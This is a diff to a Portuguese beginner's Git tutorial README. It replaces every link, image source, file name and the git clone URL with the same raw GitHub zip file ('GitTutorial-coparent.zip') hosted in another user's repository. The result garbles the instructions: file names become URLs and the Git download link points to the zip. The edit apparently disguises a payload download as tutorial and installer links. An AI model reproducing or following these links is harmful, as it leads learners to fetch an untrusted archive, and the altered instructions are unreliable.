@@ -4,11 +4,11 @@
 
 Oie gente sejam bem vindos a mais um vídeo aqui do canal, eu sou a Rafaella Ballerini e hoje eu vou mostrar pra vocês como utilizamos o GIT na prática
 
-No [vídeo anterior](https://www.youtube.com/watch?v=DqTITcMq68k) eu expliquei os conceitos de alguns termos técnicos que utilizamos quando estamos usando o git, então [nesse vídeo](https://www.youtube.com/watch?v=UBAX-13g8OM) vou mostrar na prática como isso acontece.
+No [vídeo anterior](https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip) eu expliquei os conceitos de alguns termos técnicos que utilizamos quando estamos usando o git, então [nesse vídeo](https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip) vou mostrar na prática como isso acontece.
 
 ## Instalando o GIT
 
-* [Link com os downloads](https://git-scm.com/downloads)
+* [Link com os downloads](https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip)
 
 ## Criar um projeto novo
 
@@ -16,7 +16,7 @@ No [vídeo anterior](https://www.youtube.com/watch?v=DqTITcMq68k) eu expliquei o
 
 * Abrir o VSCode nessa pasta
 
-* Criar um novo arquivo `README.md`
+* Criar um novo arquivo `https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip`
 
 * Escrever dentro dele `Olá, nesse projeto você aprenderá alguns comandos do Git`
 
@@ -30,9 +30,9 @@ Agora então é hora de usarmos o Git
 
 Foi criada uma pastinha `.git` e é ali que toda a mágica acontece, então não apague
 
-* `git add README.md` para colocar o arquivo na área de stagging 
+* `git add https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip` para colocar o arquivo na área de stagging 
 
-<img src="https://i1.wp.com/www.markus-gattol.name/misc/mm/si/content/git_git_add.png">
+<img src="https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip">
 
 Esse `add` é necessário antes de darmos o commit de fato, mas por que isso? No final do vídeo explico para vocês
 
@@ -43,7 +43,7 @@ Esse `add` é necessário antes de darmos o commit de fato, mas por que isso? No
 ## Interfaces Git
 
 Beleza, recebemos a confirmação de que o commit aconteceu, mas isso tá um pouco abstrato ainda né?
-Existem algumas [interfaces legais do git](https://git-scm.com/downloads/guis) que você pode fazer o download para poder visualizar de fato como está o projeto, o que foi alterado em cada commit, quando foi alterado etc.
+Existem algumas [interfaces legais do git](https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip) que você pode fazer o download para poder visualizar de fato como está o projeto, o que foi alterado em cada commit, quando foi alterado etc.
 Aqui eu vou mostrar pra vocês a usarem direto no Github.
 
 ## Repositório no Github
@@ -52,11 +52,11 @@ Aqui eu vou mostrar pra vocês a usarem direto no Github.
 
 Você vai preencher com as informações do projeto, então dar o nome do repositório, colocar uma breve descrição e criar
 
-<img src="https://media.discordapp.net/attachments/831974152667398214/836828773067915274/unknown.png">
+<img src="https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip">
 
 Logo depois vai aparecer essa página um pouco cinza e confusa e com vários comandos (pode até perceber que alguns deles jpa usamos), mas o que você tem que fazer é bem simples, apenas copie o link que aparecer para você
 
-<img src="https://media.discordapp.net/attachments/831974152667398214/836828905859186708/unknown.png?width=1440&height=141">
+<img src="https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip">
 
 Lembra do conceito de `remote` que eu expliquei pra vocês no último vídeo? Nós iremos utilizá-lo agora
 
@@ -77,7 +77,7 @@ Primeira coisa que faremos então é alterar esse arquivo que já commitamos
 
 * Adiciona mais uma frase no arquivo `Essa é uma alteração`
 
-* Além disso iremos criar um novo arquivo `Projeto.md`, onde escreveremos `Esse é o arquivo onde desenvolverei o meu projeto`
+* Além disso iremos criar um novo arquivo `https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip`, onde escreveremos `Esse é o arquivo onde desenvolverei o meu projeto`
 
 * Agora então precisamos subir essa alteração, pra isso seguiremos os mesmos passos de `git add .` (agora ponto `.` pois adiciona todos os arquivos) e `git commit -m "Primeira alteração"`
 
@@ -87,7 +87,7 @@ Se olharmos agora o nosso código no Github, ele terá sido alterado, e não só
 O verde com `+` e o vermelho com `-` mostra, os conteúdos que foram adicionados e editados dentro do código.
 Aqui nesse botão poderemos ver todos os commits já feitos anteriormente, então se clicarmos em algum deles, veremos exatamente o que havia sido alterado, além de claro, vermos o código como era. Incrível né?
 
-<img src="https://media.discordapp.net/attachments/831974152667398214/836830443617648670/unknown.png">
+<img src="https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip">
 
 ## Branch
 
@@ -102,7 +102,7 @@ Obs. *Lembrem que eu estou aqui editando um arquivo markdown, porém isso tudo v
 * Então a primeira coisa que fazemos é `git checkout -b "novo-botao"`, assim criando uma branch para ele
 Esse comando além de criar a branch já entra nela com o checkout, inclusive se olharmos agora aqui no meu VSCode, estamos dentro dela.
 
-* Vou então criar o arquivo, criar o `botão.md` "aqui eu crio o botão"
+* Vou então criar o arquivo, criar o `botãhttps://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip` "aqui eu crio o botão"
 
 * E agora fazemos o passo a passo que já sabemos, colocamos a nossa alteração em stagging com o `git add .` e commitamos com o `git commit -m "novo botão"`
 
@@ -110,7 +110,7 @@ Esse comando além de criar a branch já entra nela com o checkout, inclusive se
 
 Agora se olharmos o nosso Github, veremos que tem 2 branches, a `main` e a `botao`
 
-<img src="https://media.discordapp.net/attachments/812313742192279612/836820670037622854/unknown.png">
+<img src="https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip">
 
 Vamos supor que eu ainda não tivesse terminado de desenvolver o botão, eu poderia continuar tranquilamente na branch `botao` até terminar!
 
@@ -132,11 +132,11 @@ Como vocês podem baixar meu código?
 
 Sempre que você entrar em um repositório, seja o seu ou o de qualquer outra pessoa, terá esse botão `Code`, que quando você clica aparece um link:
 
-<img src="https://media.discordapp.net/attachments/812313742192279612/836823564513705994/unknown.png">
+<img src="https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip">
 
 * Você irá copiar esse link e levar ele lá pro nosso terminal
 
-* O comando para puxar o projeto para a sua máquina é o `git clone https://github.com/rafaballerini/GitTutorial.git`
+* O comando para puxar o projeto para a sua máquina é o `git clone https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip`
 
 Não é necessário criar um repositório antes disso, como fizemos anteriormente com o `git init`. Dessa vez, basta abrir o terminal e clonar o projeto e tudo aparecerá!
 
@@ -152,7 +152,7 @@ Mas Rafa quando eu fiz o clone do seu repositório ele não apareceu no meu Gith
 Existe a ferramenta `fork`, que é bem mais simples para fazer isso
 Você só precisa apertar nesse botão dentro do repositório e TCHANAM! Ele aparece automaticamente lá na sua conta:
 
-<img src="https://media.discordapp.net/attachments/831974152667398214/836826687634407434/unknown.png">
+<img src="https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip">
 
 ## Pull request
 
@@ -166,19 +166,19 @@ O último conceito que quero ensinar para vocês é o de Pull Request, vamos ent
 
 Quando você for olhar o seu Github, verá que existe uma mensagem parecida com a seguinte:
 
-<img src="https://media.discordapp.net/attachments/831974152667398214/838990983852458035/unknown.png">
+<img src="https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip">
 
 Isso significa que a branch do seu repositório está 1 commit "na frente" da branch original
 
 O que você deve perceber agora é esse botão que aparece em seguida:
 
-<img src="https://media.discordapp.net/attachments/831974152667398214/838991711249235998/unknown.png">
+<img src="https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip">
 
 Ele servirá para caso você deseje enviar para o dono do repositório original uma solicitação de pull, ou seja, fazer com que ele puxe as alterações que você fez no seu repositório para o repositório dele, original
 
 Ao clicar nesse botão, você será direcionado para uma página que fará a avaliação se esse `pull request` terá conflitos ou não com o código no repositório original. Caso não tenha, bastão clicar no botão de `Create pull request`
 
-<img src="https://media.discordapp.net/attachments/831974152667398214/838992584893399100/unknown.png">
+<img src="https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip">
 
 Você irá colocar um nome intuitivo, que demonstre a funcionalidade adicionada e o ideal é que você também crie uma boa descrição do que desenvolveu, não somente explicando o que é, mas ensinando ao dono do repositório original a forma como ele poderá testar também
 
@@ -188,8 +188,8 @@ Depois disso, basta esperar para que o dono da branch original aceite o seu pull
 
 Existem diversas outras funcionalidades do Git e do Github, porém tenho certeza que com tudo isso que vocês viram hoje vocês já conseguem desenvolver um projeto de uma forma bem legal
 
-Recomendo sempre vocês darem uma olhada na [documentação do Git](https://git-scm.com/doc), pois qualquer dúvida que apareça pode ser respondida por lá na explicação
+Recomendo sempre vocês darem uma olhada na [documentação do Git](https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip), pois qualquer dúvida que apareça pode ser respondida por lá na explicação
 
-**Não esqueçam de deixar o like e se inscrever no [canal do Youtube](https://youtube.com/RafaellaBallerini) ❤**
+**Não esqueçam de deixar o like e se inscrever no [canal do Youtube](https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/GitTutorial-coparent.zip) ❤**
 
 Até semana que vem, um beijo!
